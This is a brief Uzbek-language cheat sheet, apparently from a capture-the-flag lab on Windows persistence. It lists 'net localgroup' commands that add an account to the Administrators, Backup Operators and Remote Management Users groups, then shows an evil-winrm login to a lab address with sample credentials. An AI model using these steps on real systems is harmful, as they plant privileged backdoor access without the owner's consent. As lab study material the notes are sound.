# Bo'rimiz, gohida qo'yni maskasini ham kiyishimizga to'g'ri keladi)

### Userni Guruhlarga qo'shish
Adminlar gruppasiga:
```
net localgroup administrators __username__ /add
```

BackUp gruppasiga:
```
net localgroup "Backup Operators" __username__ /add
```

Remote management group:
```
net localgroup "Remote Management Users" __username__ /add
```

### Userga ulanish:
```
evil-winrm -i 10.10.187.100 -u thmuser1 -p Password321
```
Agar o'rnatilmagan bo'lsa, Arch uchun buyruq:
```
sudo pacman -S evil-winrm
```
